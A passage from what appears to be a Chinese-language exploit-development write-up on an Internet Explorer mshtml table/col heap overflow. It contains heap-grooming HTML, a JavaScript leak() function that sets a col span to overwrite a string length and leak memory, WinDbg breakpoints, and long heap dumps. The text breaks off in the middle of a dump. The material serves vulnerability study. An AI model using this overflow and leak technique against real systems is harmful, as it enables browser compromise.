id="30" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="31" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="32" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="33" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="34" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="35" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="36" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="37" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="38" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="39" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="40" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="41" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="42" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="43" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="44" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="45" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="46" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="47" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="48" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="49" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="50" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="51" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="52" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="53" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="54" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="55" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="56" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="57" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="58" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="59" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="60" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="61" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="62" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="63" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="64" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="65" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="66" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="67" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="68" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="69" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="70" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="71" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="72" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="73" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="74" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="75" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="76" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="77" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="78" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="79" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="80" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="81" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="82" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="83" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="84" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="85" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="86" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="87" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="88" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="89" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="90" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="91" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="92" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="93" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="94" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="95" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="96" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="97" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="98" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="99" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="100" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="101" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="102" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="103" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="104" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="105" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="106" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="107" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="108" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="109" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="110" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="111" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="112" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="113" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="114" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="115" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="116" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="117" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="118" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="119" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="120" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="121" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="122" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="123" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="124" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="125" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="126" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="127" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="128" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="129" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="130" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="131" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="132" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;因为JavaScript中的Array并不是连续的(貌似是赋值的时候动态申请的内存，通过链表之类的连接在一起)，所以可以实现上述内存布局。这里解释两个问题：为什么是(0x100 - 6) / 2因为前文也提到了，字符串除了数据本身，还有4字节的头部和2字节的尾部，所以为了保证整个字符创是0x100字节大小的，我们需要先减去头部和尾部的长度。又因为javascript中默认是使用Unicode，所以每个字符占用的是2个字节，所以还要除以2。为什么大小需要是0x100在poc分析中我们可以发现，申请的空间大小是spannum * 0x1c，在上面构造布局的代码中，spannum == 9，可知申请的空间大小为9 * 0x1c = 0xfc，在字节对齐都就是0x100。为什么需要使用div_container.appendChild(obj);这里引用c00c师傅的解释CButton的大小为0x58，无法和3次申请的0x100大小的空间连续起来，但是通过appendChild可以申请0xfc的大小，成功和前3块连续起来。调试笔记这里学到个姿势，大部分的JS函数都可以在jscript.dll中找到对应的API名字为了能够看到堆块的释放和创建，我们创建如下两个断点:12bu ntdll!RtlFreeHeap &quot;.echo free heap;db poi(esp+c) l10;g&quot;bu mshtml!CTableLayout::CalculateMinMax+0x1df &quot;.echo vulheap; dd poi(ebx+9c) l4;g&quot;第一条是在调用ntdll!RtlFreeHeap函数去释放堆块时，输出poi(esp+c)处，即被释放的地址处的数据第二条是在刚好执行完mshtml!CImplAry::EnsureSizeWorker的下一条指令处，输出刚申请的堆块的地址由于输出的信息可能较多，所以可以将其保存在文档中，命令.logopen。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687880:005&gt; .logopenOpened log file &apos;dbgeng.log&apos;0:005&gt; gfree heap000cc870 5c 00 3f 00 3f 00 5c 00-43 00 3a 00 5c 00 57 00 \.?.?.\.C.:.\.W....free heap000e4b00 40 00 00 00 45 00 45 00-45 00 45 00 45 00 45 00 @...E.E.E.E.E.E.free heap000eef28 40 00 00 00 41 00 41 00-41 00 41 00 41 00 41 00 @...A.A.A.A.A.A....free heap02b89e38 fa 00 00 00 45 00 45 00-45 00 45 00 45 00 45 00 ....E.E.E.E.E.E.free heap02b8a258 fa 00 00 00 45 00 45 00-45 00 45 00 45 00 45 00 ....E.E.E.E.E.E. &lt;======++free heap ||02b8a678 fa 00 00 00 45 00 45 00-45 00 45 00 45 00 45 00 ....E.E.E.E.E.E. ||free heap ||02b8aa98 fa 00 00 00 45 00 45 00-45 00 45 00 45 00 45 00 ....E.E.E.E.E.E. ||... ||vulheap ||02b8a258 0000018e 00450045 00450045 00450045 =======++...0:013&gt; db 02b8a258 l40002b8a258 05 14 00 00 05 14 00 00-05 14 00 00 00 00 00 00 ................02b8a268 45 00 45 00 41 00 45 00-58 40 01 00 05 14 00 00 E.E.A.E.X@......02b8a278 05 14 00 00 05 14 00 00-00 00 00 00 45 00 45 00 ............E.E.02b8a288 41 00 45 00 58 40 01 00-05 14 00 00 05 14 00 00 A.E.X@..........02b8a298 05 14 00 00 00 00 00 00-45 00 45 00 41 00 45 00 ........E.E.A.E.02b8a2a8 58 40 01 00 05 14 00 00-05 14 00 00 05 14 00 00 X@..............02b8a2b8 00 00 00 00 45 00 45 00-41 00 45 00 58 40 01 00 ....E.E.A.E.X@..02b8a2c8 05 14 00 00 05 14 00 00-05 14 00 00 00 00 00 00 ................02b8a2d8 45 00 45 00 41 00 45 00-58 40 01 00 05 14 00 00 E.E.A.E.X@......02b8a2e8 05 14 00 00 05 14 00 00-00 00 00 00 45 00 45 00 ............E.E.02b8a2f8 41 00 45 00 58 40 01 00-05 14 00 00 05 14 00 00 A.E.X@..........02b8a308 05 14 00 00 00 00 00 00-45 00 45 00 41 00 45 00 ........E.E.A.E.02b8a318 58 40 01 00 05 14 00 00-05 14 00 00 05 14 00 00 X@..............02b8a328 00 00 00 00 45 00 45 00-41 00 45 00 58 40 01 00 ....E.E.A.E.X@..02b8a338 05 14 00 00 05 14 00 00-05 14 00 00 00 00 00 00 ................02b8a348 45 00 45 00 41 00 45 00-58 40 01 00 45 00 00 00 E.E.A.E.X@..E...02b8a358 cc 82 cf 1c 79 00 00 88-fa 00 00 00 41 00 41 00 ....y.......A.A.02b8a368 41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00 A.A.A.A.A.A.A.A.02b8a378 41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00 A.A.A.A.A.A.A.A.02b8a388 41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00 A.A.A.A.A.A.A.A.02b8a398 41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00 A.A.A.A.A.A.A.A.02b8a3a8 41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00 A.A.A.A.A.A.A.A.02b8a3b8 41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00 A.A.A.A.A.A.A.A.02b8a3c8 41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00 A.A.A.A.A.A.A.A.02b8a3d8 41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00 A.A.A.A.A.A.A.A.02b8a3e8 41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00 A.A.A.A.A.A.A.A.02b8a3f8 41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00 A.A.A.A.A.A.A.A.02b8a408 41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00 A.A.A.A.A.A.A.A.02b8a418 41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00 A.A.A.A.A.A.A.A.02b8a428 41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00 A.A.A.A.A.A.A.A.02b8a438 41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00 A.A.A.A.A.A.A.A.02b8a448 41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00 A.A.A.A.A.A.A.A.02b8a458 41 00 41 00 41 00 00 00-2b 82 cf 1c 00 00 00 88 A.A.A...+.......02b8a468 fa 00 00 00 42 00 42 00-42 00 42 00 42 00 42 00 ....B.B.B.B.B.B.02b8a478 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.02b8a488 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.02b8a498 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.02b8a4a8 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.02b8a4b8 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.02b8a4c8 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.02b8a4d8 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.02b8a4e8 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.02b8a4f8 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.02b8a508 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.02b8a518 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.02b8a528 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.02b8a538 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.02b8a548 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.02b8a558 42 00 42 00 42 00 42 00-42 00 42 00 42 00 00 00 B.B.B.B.B.B.B...02b8a568 0a 82 cf 1c 62 00 00 8c-f8 3a b2 65 68 76 0b 00 ....b....:.ehv..02b8a578 48 28 b6 02 90 3c b2 65-01 00 00 00 00 00 00 00 H(...&lt;.e........02b8a588 09 08 08 01 ff ff ff ff-00 00 00 00 00 00 00 00 ................02b8a598 00 00 00 00 ff ff ff ff-80 00 00 00 ff ff ff ff ................02b8a5a8 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................02b8a5b8 00 00 00 00 24 00 00 00-20 00 00 00 00 00 00 00 ....$... .......02b8a5c8 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................02b8a5d8 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................02b8a5e8 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................02b8a5f8 00 00 00 00 00 00 00 00-00 00 00 00 20 a6 b8 02 ............ ...02b8a608 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................02b8a618 01 00 00 00 01 00 00 00-00 00 00 00 00 00 00 00 ................02b8a628 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................02b8a638 ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff ................02b8a648 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................可以在代码最后加上一句alert(1)，以提醒已经执行完毕。在log中找到最后一个vulheap，该heap即为我们打算去控制的col标签所创建的heap，id为132查看该处内存，很容易发现字符串”EEEE…”处已经被覆盖。泄露数据我们已经成功的构造了前文中所需的内存布局，接下来就需要进行第一次溢出了，让溢出数据覆盖掉后面字符串的长度信息。由上文数据可知，从起始地址0x02b8a258到字符串”BBBB…”的长度信息地址0x02b8a468，长度为0x210，再加上4字节的长度信息，总共为0x214字节。因为数据是以0x1c为单位长度写入的，所以需要设置span值恰好为0x214/0x1c == 0x13 == 19溢出代码12345function leak() &#123; var leak_col = document.getElementById("132"); leak_col.width = 41; leak_col.span = 19;&#125;调试笔记同样的方法，找到最后一块vulheap12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364650:013&gt; db 02cd1e70 l40002cd1e70 05 14 00 00 05 14 00 00-05 14 00 00 00 00 00 00 ................02cd1e80 45 00 45 00 41 00 45 00-58 40 01 00 05 14 00 00 E.E.A.E.X@......02cd1e90 05 14 00 00 05 14 00 00-00 00 00 00 45 00 45 00 ............E.E.02cd1ea0 41 00 45 00 58 40 01 00-05 14 00 00 05 14 00 00 A.E.X@..........02cd1eb0 05 14 00 00 00 00 00 00-45 00 45 00 41 00 45 00 ........E.E.A.E.02cd1ec0 58 40 01 00 05 14 00 00-05 14 00 00 05 14 00 00 X@..............02cd1ed0 00 00 00 00 45 00 45 00-41 00 45 00 58 40 01 00 ....E.E.A.E.X@..02cd1ee0 05 14 00 00 05 14 00 00-05 14 00 00 00 00 00 00 ................02cd1ef0 45 00 45 00 41 00 45 00-58 40 01 00 05 14 00 00 E.E.A.E.X@......02cd1f00 05 14 00 00 05 14 00 00-00 00 00 00 45 00 45 00 ............E.E.02cd1f10 41 00 45 00 58 40 01 00-05 14 00 00 05 14 00 00 A.E.X@..........02cd1f20 05 14 00 00 00 00 00 00-45 00 45 00 41 00 45 00 ........E.E.A.E.02cd1f30 58 40 01 00 05 14 00 00-05 14 00 00 05 14 00 00 X@..............02cd1f40 00 00 00 00 45 00 45 00-41 00 45 00 58 40 01 00 ....E.E.A.E.X@..02cd1f50 05 14 00 00 05 14 00 00-05 14 00 00 00 00 00 00 ................02cd1f60 45 00 45 00 41 00 45 00-58 40 01 00 05 14 00 00 E.E.A.E.X@......02cd1f70 05 14 00 00 05 14 00 00-fa 00 00 00 41 00 41 00 ............A.A.02cd1f80 41 00 41 00 58 40 01 00-05 14 00 00 05 14 00 00 A.A.X@..........02cd1f90 05 14 00 00 41 00 41 00-41 00 41 00 41 00 41 00 ....A.A.A.A.A.A.02cd1fa0 58 40 01 00 05 14 00 00-05 14 00 00 05 14 00 00 X@..............02cd1fb0 41 00 41 00 41 00 41 00-41 00 41 00 58 40 01 00 A.A.A.A.A.A.X@..02cd1fc0 05 14 00 00 05 14 00 00-05 14 00 00 41 00 41 00 ............A.A.02cd1fd0 41 00 41 00 41 00 41 00-58 40 01 00 05 14 00 00 A.A.A.A.X@......02cd1fe0 05 14 00 00 05 14 00 00-41 00 41 00 41 00 41 00 ........A.A.A.A.02cd1ff0 41 00 41 00 58 40 01 00-05 14 00 00 05 14 00 00 A.A.X@..........02cd2000 05 14 00 00 41 00 41 00-41 00 41 00 41 00 41 00 ....A.A.A.A.A.A.02cd2010 58 40 01 00 05 14 00 00-05 14 00 00 05 14 00 00 X@..............02cd2020 41 00 41 00 41 00 41 00-41 00 41 00 58 40 01 00 A.A.A.A.A.A.X@..02cd2030 05 14 00 00 05 14 00 00-05 14 00 00 41 00 41 00 ............A.A.02cd2040 41 00 41 00 41 00 41 00-58 40 01 00 05 14 00 00 A.A.A.A.X@......02cd2050 05 14 00 00 05 14 00 00-41 00 41 00 41 00 41 00 ........A.A.A.A.02cd2060 41 00 41 00 58 40 01 00-05 14 00 00 05 14 00 00 A.A.X@..........02cd2070 05 14 00 00 41 00 00 00-03 e3 d4 22 20 28 00 88 ....A......&quot; (..02cd2080 58 40 01 00 42 00 42 00-42 00 42 00 42 00 42 00 X@..B.B.B.B.B.B.02cd2090 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.02cd20a0 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.02cd20b0 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.02cd20c0 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.02cd20d0 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.02cd20e0 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.02cd20f0 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.02cd2100 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.02cd2110 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.02cd2120 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.02cd2130 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.02cd2140 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.02cd2150 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.02cd2160 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.02cd2170 42 00 42 00 42 00 42 00-42 00 42 00 42 00 00 00 B.B.B.B.B.B.B...02cd2180 3c e3 d4 22 61 70 00 8c-f8 3a b2 65 90 05 31 00 &lt;..&quot;ap...:.e..1.02cd2190 50 7c cd 02 90 3c b2 65-01 00 00 00 00 00 00 00 P|...&lt;.e........02cd21a0 09 08 08 01 ff ff ff ff-00 00 00 00 00 00 00 00 ................02cd21b0 00 00 00 00 ff ff ff ff-80 00 00 00 ff ff ff ff ................02cd21c0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................02cd21d0 00 00 00 00 24 00 00 00-20 00 00 00 00 00 00 00 ....$... .......02cd21e0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................02cd21f0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................02cd2200 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................02cd2210 00 00 00 00 00 00 00 00-00 00 00 00 38 22 cd 02 ............8&quot;..02cd2220 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................02cd2230 01 00 00 00 01 00 00 00-00 00 00 00 00 00 00 00 ................02cd2240 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................02cd2250 ff ff 